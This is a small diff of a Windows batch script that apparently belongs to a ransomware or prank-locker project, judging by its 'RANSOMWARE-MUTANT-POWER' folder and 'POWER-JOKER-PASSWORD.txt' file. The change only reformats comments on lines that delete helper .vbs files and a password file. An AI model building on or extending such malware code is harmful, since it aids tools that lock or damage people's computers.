@@ -259,8 +259,10 @@ chcp 949
 set backup=%cd%
 cd/
 if not %cd%==C:\ cd /d c:\
-del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs      ::Create clickme vbs.vbs in appdata
-del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs       ::Create clickme vbs.vbs in appdata
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbso.vbs      
+::Create clickme vbs.vbs in appdata
+del %userprofile%\AppData\RANSOMWARE-MUTANT-POWER\clickmevbs.vbs       
+::Create clickme vbs.vbs in appdata
 del %userprofile%\POWER-JOKER-PASSWORD.txt
 cd %backup%               ::go to backup
 if %cd%==%userprofile%\AppData goto a
